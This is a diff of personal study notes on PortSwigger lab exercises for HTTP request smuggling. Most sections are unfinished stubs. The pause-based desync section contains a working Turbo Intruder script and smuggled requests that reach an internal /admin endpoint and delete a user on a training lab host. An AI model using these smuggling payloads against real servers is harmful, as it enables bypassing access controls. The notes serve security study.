@@ -1,66 +1,175 @@
-# **HTTP request smuggling**
+<span style="color:yellow;font-weight:700;font-size:30px">
+HTTP request smuggling: 3 Labs
+</span>
 https://portswigger.net/web-security/request-smuggling
 
 **HTTP Desync Attacks: Request Smuggling Reborn:**
 
 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
 
-# 1.Lab: HTTP request smuggling, basic CL.TE vulnerability
+# ***1.Lab: HTTP request smuggling, basic CL.TE vulnerability***
 https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
 
 ```(to be completed from soultion below...)```
 
 
-# 2.Lab: HTTP request smuggling, basic TE.CL vulnerability
+# ***2.Lab: HTTP request smuggling, basic TE.CL vulnerability***
 https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
 
 ```(to be completed from soultion below...)```
 
 
-# 3.Lab: HTTP request smuggling, obfuscating the TE header
+# ***3.Lab: HTTP request smuggling, obfuscating the TE header***
 https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
 
-#
-# **Finding HTTP request smuggling vulnerabilities**
+
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+Finding HTTP request smuggling vulnerabilities: 2 Labs
+</span>
+
 https://portswigger.net/web-security/request-smuggling/finding
 
 
-# 1. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+# ***1. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses***
 https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
 
 ```(to be completed from soultion below...)```
 
-# 2. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+# ***2. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses***
 https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
 
 ```(to be completed from soultion below...)```
 
-# **Exploiting HTTP request smuggling vulnerabilities**
+<span style="color:yellow;font-weight:700;font-size:30px">
+Exploiting HTTP request smuggling vulnerabilities:  Labs
+</span>
+
 https://portswigger.net/web-security/request-smuggling/exploiting
 
 
-# 1. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+# ***1. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability***
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
 
 ```(to be completed from soultion below...)```
 
-# 2. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+# ***2. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability***
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
 
 ```(to be completed from soultion below...)```
 
-# 3. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+# ***3. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting***
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
 
 ```(to be completed from soultion below...)```
 
-# 4. Lab: Exploiting HTTP request smuggling to capture other users' requests
+# ***4. Lab: Exploiting HTTP request smuggling to capture other users' requests***
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-cature-other-users-requests
 
 ```(to be completed from soultion below...)```
 
-# 5. Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+# ***5. Lab: Exploiting HTTP request smuggling to deliver reflected XSS***
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
+
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+Client-side desync  2 Lab
+</span>
+
+https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
+
+1. 
+2. 
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+Pause-based desync:  1 Lab
+</span>
+
+https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync
+
+ This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.
+
+To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at /admin, then delete the user carlos. 
+
+Some server-side pause-based desync vulnerabilities can't be exploited using Burp's core tools. You must use the Turbo Intruder extension to solve this lab. 
+
+**material**
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+
+from previous labs:
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a5600b20333dff4c00669e0008900cf.web-security-academy.net
+Cookie: session=g7dk6M42BAlaCge5bRfY2UUbrkTgVcpx
+Connection: keep-alive
+Content-Length: 63
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+```
+1. check for dsync:
+
+
+
+if not working check if request has \r\n\r\n in the end
+
+
+2. payload:
+**intruder:**
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=500,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['Content-Length: 171\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+
+**Attack request:**
+```
+POST /resources HTTP/1.1
+Host: 0adf00fb04059385c078d83200950011.web-security-academy.net
+Cookie: session=5FpST7gbaHJvcQdBMBa8GSPprFONGjBP
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 171
+
+POST /admin/delete/ HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+csrf=DHagB4bCjIHsqTfd7d05kyFDOmPbthrM&username=carlos
+
+lab solved
+
+pointers:
+content length should be correct otherwise intruder pause filter will fail
+```
+
+# Lab Solved
+
+
+
+
+
+# solutions without the writeup - to be completed above
 
 **xss-test**
 ```
